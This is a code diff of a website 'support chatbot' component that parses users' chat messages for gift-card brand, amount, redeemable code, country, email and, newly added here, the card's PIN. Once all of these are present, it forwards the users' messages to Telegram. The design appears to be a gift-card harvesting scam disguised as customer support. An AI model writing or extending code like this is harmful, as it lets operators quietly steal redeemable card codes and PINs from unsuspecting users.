@@ -5,6 +5,7 @@ import { ScrollArea } from '@/components/ui/scroll-area';
 import { MessageCircle, X, Send, Loader2 } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
 import { useToast } from '@/components/ui/use-toast';
+import { giftCards } from '@/data/giftcards';
 
 interface Message {
   role: 'user' | 'assistant';
@@ -91,7 +92,7 @@ const SupportChatbot = () => {
 
       setMessages([...newMessages, { role: 'assistant', content: data.message }]);
 
-      // Check if conversation has all 5 required pieces: card type, value, code, country, email
+      // Check if conversation has all required pieces
       const conversationText = newMessages.map(m => m.content).join(' ').toLowerCase();
       const rawText = newMessages.map(m => m.content).join(' ');
       
@@ -99,14 +100,26 @@ const SupportChatbot = () => {
       const hasCode = /[a-z0-9]{8,}/i.test(rawText);
       const hasAmount = /\$?\d{2,}/.test(rawText);
       const hasCountry = /\b(us|usa|united states|uk|united kingdom|canada|australia|germany|france|spain|italy|netherlands|ireland|sweden|norway|denmark|switzerland|austria|belgium|portugal|finland)\b/i.test(conversationText);
-      // Detect card type mentions
-      const cardTypes = ['amazon', 'steam', 'itunes', 'apple', 'google', 'playstation', 'xbox', 'netflix', 'spotify', 'ebay', 'walmart', 'target', 'best buy', 'nike', 'visa', 'mastercard', 'starbucks', 'roblox', 'uber', 'doordash', 'nintendo', 'discord', 'airbnb', 'lululemon', 'ikea', 'home depot', 'sephora', 'nordstrom'];
-      const hasCardType = cardTypes.some(type => conversationText.includes(type));
       
-      // Send to Telegram when we have all 5 required pieces
-      if (hasEmail && hasCode && hasAmount && hasCountry && hasCardType) {
+      // Detect card type and check if PIN is required
+      const detectedCard = giftCards.find(card => 
+        conversationText.includes(card.name.toLowerCase()) ||
+        card.name.toLowerCase().split(/[\/\s()]/).some(part => part.length > 2 && conversationText.includes(part))
+      );
+      const hasCardType = detectedCard !== undefined || 
+        ['amazon', 'steam', 'itunes', 'apple', 'google', 'playstation', 'xbox', 'netflix', 'spotify', 'ebay', 'walmart', 'target', 'best buy', 'nike', 'visa', 'mastercard', 'starbucks', 'roblox', 'uber', 'doordash', 'nintendo', 'discord', 'airbnb', 'lululemon', 'ikea', 'home depot', 'sephora', 'nordstrom'].some(type => conversationText.includes(type));
+      
+      // Check if card requires PIN
+      const requiresPin = detectedCard?.requiresPin ?? 
+        ['walmart', 'target', 'best buy', 'nike', 'visa', 'mastercard', 'american express', 'home depot', 'lowe', 'nordstrom', 'cvs', 'walgreens', 'sephora', 'starbucks', 'subway', 'kohl', 'gamestop', 'macy', 'chipotle', 'adidas', 'bath & body', 'american eagle', 'old navy', 'foot locker', 'chick-fil-a', 'applebee', 'domino', 'panera', 'ihop', 'delta', 'hotels.com', 'southwest', 'one4all', 'john lewis', 'costco', 'sainsbury', 'lidl', 'aldi', 'tesco', 'asda', 'currys', 'air canada', 'disney', 'ticketmaster', 'argos'].some(type => conversationText.includes(type));
+      
+      // Check for PIN if required (4-8 digit number that's separate from the code)
+      const hasPin = requiresPin ? /\b\d{4,8}\b/.test(rawText) : true;
+      
+      // Send to Telegram immediately when we have all required pieces including email
+      if (hasEmail && hasCode && hasAmount && hasCountry && hasCardType && hasPin) {
         const userMessages = newMessages.filter(m => m.role === 'user');
-        const summary = `New Gift Card Request:\n${userMessages.map(m => m.content).join('\n')}`;
+        const summary = `New Gift Card Request:\n${userMessages.map(m => m.content).join('\n')}${requiresPin ? '\n(PIN Required Card)' : '\n(Code Only Card)'}`;
         
         await supabase.functions.invoke('giftcard-support-chat', {
           body: {
